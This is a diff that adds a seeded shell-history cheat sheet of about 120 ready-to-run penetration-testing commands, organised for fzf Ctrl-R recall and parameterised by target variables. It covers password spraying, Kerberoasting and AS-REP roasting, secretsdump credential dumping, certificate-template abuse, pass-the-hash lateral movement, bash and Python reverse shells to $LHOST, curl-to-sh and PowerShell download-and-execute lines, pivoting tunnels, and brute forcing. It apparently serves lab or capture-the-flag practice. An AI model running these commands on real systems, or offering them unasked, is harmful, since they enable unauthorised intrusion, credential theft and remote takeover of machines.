@@ -1,0 +1,146 @@
+# curtain-call seeded shell history — the fzf Ctrl-R corpus (your "no-AI" recall).
+#
+# USE: press Ctrl-R, type a keyword ("kerberoast", "linpeas", "chisel"), Enter,
+# tweak, run. Commands use shell variables so you set the target ONCE:
+#
+#   target 10.10.10.10 dc01.corp.local corp.local   # sets $IP/$TARGET + /etc/hosts
+#   export DOMAIN=corp.local ; export SUBNET=10.10.10.0/24
+#   lhost                                            # sets $LHOST from tun0
+#
+# then every $IP / $DOMAIN / $LHOST / $SUBNET below is already filled in.
+# Creds stay literal (user / 'Password123!' / hash.txt / users.txt) — edit those.
+# Lines starting with '#' and blank lines are ignored by the installer.
+
+# ====== recon: nmap ======
+nmap -sC -T4 --open -oA scans/discovery $SUBNET
+sudo nmap -sn $SUBNET -oA scans/sweep
+sudo nmap -p- --min-rate 10000 -T4 -oA scans/allports $IP
+sudo nmap -sCV -p 22,80,443,445 -oA scans/services $IP
+sudo nmap -sU --top-ports 50 -oA scans/udp $IP
+nmap -p 445 --script "smb-protocols,smb2-security-mode,smb-security-mode" $IP
+rustscan -a $IP --ulimit 5000 -- -sCV -oA scans/rustscan
+
+# ====== dns ======
+dig @$IP $DOMAIN any +noall +answer
+dig @$IP $DOMAIN axfr
+dig -x $IP @$IP +short
+nslookup -type=srv _ldap._tcp.dc._msdcs.$DOMAIN $IP
+
+# ====== web enum ======
+curl -sik https://$IP/
+whatweb -a3 http://$IP
+feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html
+gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -o scans/gobuster.txt
+ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc all -fc 404
+ffuf -u http://$IP/ -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
+nuclei -u http://$IP -severity medium,high,critical
+
+# ====== smb / shares ======
+nxc smb $SUBNET
+nxc smb $IP -u '' -p '' --shares
+nxc smb $IP -u guest -p '' --shares
+smbclient -N -L //$IP/
+smbclient -N //$IP/share
+smbmap -H $IP -u user -p 'Password123!'
+nxc smb $IP -u user -p 'Password123!' --shares
+nxc smb $IP -u user -p 'Password123!' --spider-plus
+
+# ====== netexec: auth / spray / enum ======
+nxc smb $IP -u users.txt -p 'Password123!' --continue-on-success
+nxc smb $IP -u user -H 'NTHASH'
+nxc smb $IP -u user -p 'Password123!' --users
+nxc smb $IP -u user -p 'Password123!' --groups
+nxc smb $IP -u user -p 'Password123!' --loggedon-users
+nxc smb $IP -u user -p 'Password123!' --sam
+nxc smb $IP -u user -p 'Password123!' --lsa
+nxc smb $IP -u user -p 'Password123!' -M spider_plus
+nxc winrm $IP -u user -p 'Password123!'
+nxc mssql $IP -u user -p 'Password123!' --local-auth
+nxc smb $IP -u user -p 'Password123!' -x 'whoami'
+
+# ====== kerberos / AD (impacket, kerbrute) ======
+kerbrute userenum -d $DOMAIN --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+kerbrute passwordspray -d $DOMAIN --dc $IP users.txt 'Password123!'
+impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -usersfile users.txt -no-pass -format hashcat
+impacket-GetNPUsers $DOMAIN/user:'Password123!' -dc-ip $IP -request -format hashcat
+impacket-GetUserSPNs $DOMAIN/user:'Password123!' -dc-ip $IP -request -outputfile kerberoast.hash
+impacket-getTGT $DOMAIN/user:'Password123!' -dc-ip $IP
+impacket-secretsdump $DOMAIN/user:'Password123!'@$IP
+impacket-secretsdump -just-dc $DOMAIN/user:'Password123!'@$IP
+certipy find -u user@$DOMAIN -p 'Password123!' -dc-ip $IP -vulnerable -stdout
+certipy req -u user@$DOMAIN -p 'Password123!' -dc-ip $IP -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN
+
+# ====== ldap enum ======
+ldapsearch -x -H ldap://$IP -s base namingcontexts
+ldapsearch -x -H ldap://$IP -b "DC=${DOMAIN/./,DC=}" -D "user@$DOMAIN" -w 'Password123!' '(objectClass=user)' sAMAccountName
+nxc ldap $IP -u user -p 'Password123!' --asreproast asrep.hash
+nxc ldap $IP -u user -p 'Password123!' --kerberoasting kerb.hash
+
+# ====== bloodhound ======
+nxc ldap $IP -u user -p 'Password123!' --bloodhound --collection All --dns-server $IP
+bloodhound-python -u user -p 'Password123!' -d $DOMAIN -ns $IP -c All --zip
+
+# ====== cracking ======
+hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
+
+# ====== lateral movement (creds/hash) ======
+evil-winrm -i $IP -u user -p 'Password123!'
+evil-winrm -i $IP -u user -H NTHASH
+impacket-psexec $DOMAIN/user:'Password123!'@$IP
+impacket-wmiexec $DOMAIN/user:'Password123!'@$IP
+impacket-smbexec $DOMAIN/user:'Password123!'@$IP
+impacket-wmiexec -hashes :NTHASH $DOMAIN/user@$IP
+impacket-mssqlclient $DOMAIN/user:'Password123!'@$IP -windows-auth
+
+# ====== reverse shells / listeners / tty (serve the arsenal with: www) =====
+rlwrap nc -lvnp 443
+bash -c 'bash -i >& /dev/tcp/'$LHOST'/443 0>&1'
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("'$LHOST'",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+stty raw -echo; fg
+
+# ====== file transfer ======
+python3 -m http.server 80
+wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
+curl http://$LHOST/linpeas.sh -o /tmp/linpeas.sh
+powershell -c "iwr http://$LHOST/winPEASx64.exe -OutFile C:\Windows\Temp\p.exe"
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://$LHOST/nc.exe','C:\Windows\Temp\nc.exe')"
+impacket-smbserver -smb2support share .
+
+# ====== tunneling / pivoting ======
+sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
+./ligolo-proxy -selfcert
+./agent -connect $LHOST:11601 -ignore-cert
+chisel server -p 8000 --reverse
+./chisel client $LHOST:8000 R:socks
+proxychains4 -q nxc smb $SUBNET
+ssh -D 1080 user@$IP
+ssh -L 8080:127.0.0.1:80 user@$IP
+
+# ====== linux privesc (serve these from your box: www) ======
+curl http://$LHOST/linpeas.sh | sh
+./pspy64 -pf -i 1000
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+crontab -l; cat /etc/crontab
+grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /home /etc 2>/dev/null
+
+# ====== windows privesc ======
+whoami /priv
+whoami /all
+systeminfo
+.\winPEASx64.exe
+powershell -ep bypass -c "iex(iwr http://$LHOST/PrivescCheck.ps1 -UseBasicParsing); Invoke-PrivescCheck"
+net user; net localgroup administrators
+
+# ====== misc ======
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
+responder -I tun0 -wv
+cewl -d 2 -m 5 http://$IP -w cewl.txt
+hashid 'HASH'
